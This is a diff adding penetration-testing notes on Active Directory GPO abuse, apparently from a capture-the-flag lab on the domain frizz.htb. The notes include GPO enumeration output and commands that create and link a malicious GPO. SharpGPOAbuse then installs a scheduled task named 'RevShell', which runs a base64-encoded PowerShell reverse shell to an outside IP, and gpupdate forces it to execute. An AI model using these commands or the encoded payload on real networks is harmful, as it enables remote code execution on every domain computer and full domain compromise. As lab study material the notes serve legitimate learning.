@@ -27,3 +27,45 @@ Next time a workstation user logs in → your payload executes → creds pop →
 ---
 ###  So in short:  
 `WriteGPlink` = ability to **force policy execution on all users/computers in that OU** → huge attack surface → often leads to privilege escalation.
+
+
+---
+
+if you have privileges to create or modify GPO's, that would be very valuable thing.
+[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) is a project for attacking GPOs with capabilities to modify users, add local admins, set startup scripts, run commands, etc. There’s an already compiled copy of SharpGPOAbuse available from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpGPOAbuse.exe).
+
+`SharpGPOAbuse.exe` requires a “vulnerable” (writable) GPO. There are two GPOs on the domain, so you can enumeratr for GPO or create one if you have privileges to do so:
+
+### List GPO's in AD
+```powershell
+Get-GPO -all
+
+DisplayName      : Default Domain Policy
+DomainName       : frizz.htb
+Owner            : frizz\Domain Admins
+Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
+GpoStatus        : AllSettingsEnabled
+Description      : 
+CreationTime     : 10/29/2024 7:19:24 AM
+ModificationTime : 10/29/2024 7:25:44 AM
+UserVersion      : 
+ComputerVersion  : 
+
+```
+
+
+```powershell
+
+# Create GPO
+New-GPO -name "0xdf-rev"
+
+# Link GPO
+New-GPLink -Name "0xdf-rev" -target "DC=frizz,DC=htb"
+
+# Configure GPO and computer to run compline to it.
+SharpGPOAbuse.exe --addcomputertask --GPOName "0xdf-rev" --Author "0xdf" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
+
+# upadte policy
+gpupdate /force
+```
+
